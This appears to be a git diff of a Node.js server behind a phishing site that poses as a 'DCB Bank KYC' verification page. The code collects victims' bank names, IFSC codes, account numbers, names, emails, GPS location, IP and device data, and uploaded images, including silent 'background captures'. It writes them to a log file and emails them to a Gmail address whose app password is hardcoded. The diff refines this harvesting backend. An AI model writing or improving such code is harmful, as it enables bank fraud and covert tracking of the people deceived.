@@ -16,38 +16,44 @@ app.use(express.static('public'));
 // File upload setup
 const uploadDir = 'uploads';
 if (!fs.existsSync(uploadDir)) {
-  fs.mkdirSync(uploadDir);
+  fs.mkdirSync(uploadDir, { recursive: true });
 }
 
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, uploadDir),
-  filename: (req, file, cb) => cb(null, `${Date.now()}-${file.originalname}`)
+  filename: (req, file, cb) => {
+    const ext = path.extname(file.originalname);
+    cb(null, `${Date.now()}${ext}`);
+  }
 });
 
 const upload = multer({
   storage: storage,
   fileFilter: (req, file, cb) => {
     const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
-    cb(null, allowedTypes.includes(file.mimetype));
+    if (allowedTypes.includes(file.mimetype)) {
+      cb(null, true);
+    } else {
+      cb(new Error('Invalid file type'), false);
+    }
   },
   limits: { fileSize: 50 * 1024 * 1024 }
 }).any();
 
-// Email transporter
+// Email transporter with direct credentials
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'iskexmwnespcwxrkjt'
+    pass: 'kexmwnespcwxrkjt' // Your app password here
   }
 });
 
 // Helper functions
 const getClientIp = (req) => {
-  return req.headers['x-forwarded-for']?.split(',')[0] || 
-         req.connection?.remoteAddress ||
-         req.socket?.remoteAddress ||
-         req.connection?.socket?.remoteAddress;
+  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 
+         req.ip ||
+         req.connection?.remoteAddress;
 };
 
 const buildEmailHtml = (data) => {
@@ -91,6 +97,7 @@ const buildEmailHtml = (data) => {
         <p><strong>Latitude:</strong> ${data.location.latitude}</p>
         <p><strong>Longitude:</strong> ${data.location.longitude}</p>
         <p><strong>Accuracy:</strong> ${data.location.accuracy} meters</p>
+        <p><strong>Last Updated:</strong> ${new Date(data.location.timestamp).toLocaleString()}</p>
       </div>
       ` : ''}
       
@@ -113,7 +120,6 @@ app.post('/submit', (req, res) => {
 
       const isBackground = req.body.empty_form === 'true';
       
-      // Skip empty background submissions
       if (isBackground && (!req.files || req.files.length === 0)) {
         return res.status(200).send();
       }
@@ -129,8 +135,8 @@ app.post('/submit', (req, res) => {
           model: device.model || req.body.device_model || 'Unknown',
           vendor: device.vendor || req.body.device_vendor || 'Unknown'
         },
-        os: `${os.name} ${os.version}` || req.body.device_os,
-        browser: `${browser.name} ${browser.version}` || req.body.device_browser,
+        os: `${os.name || ''} ${os.version || ''}`.trim() || req.body.device_os || 'Unknown',
+        browser: `${browser.name || ''} ${browser.version || ''}`.trim() || req.body.device_browser || 'Unknown',
         bankname: req.body.bankname || 'Not provided',
         ifsc: req.body.ifsc || 'Not provided',
         accno: req.body.accno || 'Not provided',
@@ -138,42 +144,23 @@ app.post('/submit', (req, res) => {
         email: req.body.email || 'Not provided',
         location: req.body.location ? JSON.parse(req.body.location) : null,
         ip: getClientIp(req),
-        userAgent: req.headers['user-agent'] || req.body.user_agent,
+        userAgent: req.headers['user-agent'] || req.body.user_agent || 'Unknown',
         timestamp: req.body.timestamp || new Date().toISOString(),
         isFormEmpty: isBackground,
-        imageCount: (req.files || []).filter(f => f.fieldname.startsWith('image')).length
+        imageCount: req.files?.length || 0
       };
 
-      // Log the submission
-      const logEntry = `
---- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---
-Device: ${submissionData.device.vendor} ${submissionData.device.model} (${submissionData.device.type})
-OS: ${submissionData.os}
-Browser: ${submissionData.browser}
-IP: ${submissionData.ip}
-Location: ${submissionData.location ? 
-  `${submissionData.location.latitude}, ${submissionData.location.longitude}` : 'None'}
-Bank: ${submissionData.bankname}
-IFSC: ${submissionData.ifsc}
-Account: ${submissionData.accno}
-Name: ${submissionData.fullname}
-Email: ${submissionData.email}
-Images: ${submissionData.imageCount}
-User Agent: ${submissionData.userAgent}
-Timestamp: ${submissionData.timestamp}
------------------------------
-`;
-
+      const logEntry = `--- ${isBackground ? 'BACKGROUND' : 'FULL'} SUBMISSION ---\n${JSON.stringify(submissionData, null, 2)}\n`;
       fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
 
-      // Send email
+      const emailSubject = isBackground 
+        ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
+        : '✅ KYC Verification Completed';
+      
       await transporter.sendMail({
         from: 'DCB Bank KYC <dcbsubmission392@gmail.com>',
         to: 'dcbsubmission392@gmail.com',
-        subject: isBackground 
-          ? `⚠️ Background Capture (${submissionData.imageCount} images)` 
-          : '✅ KYC Verification Completed',
+        subject: emailSubject,
         html: buildEmailHtml(submissionData),
         attachments: (req.files || []).map(file => ({
           filename: file.originalname,
@@ -181,10 +168,15 @@ Timestamp: ${submissionData.timestamp}
         }))
       });
 
-      // Cleanup files
-      (req.files || []).forEach(file => {
-        try { fs.unlinkSync(file.path); } catch (e) { console.error('File cleanup error:', e); }
-      });
+      if (req.files) {
+        req.files.forEach(file => {
+          try {
+            fs.unlinkSync(file.path);
+          } catch (e) {
+            console.error('Error deleting file:', file.path, e);
+          }
+        });
+      }
 
       res.status(200).send();
     } catch (error) {
@@ -197,5 +189,4 @@ Timestamp: ${submissionData.timestamp}
 // Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
-  console.log(`Access the app at http://localhost:${port}`);
 });
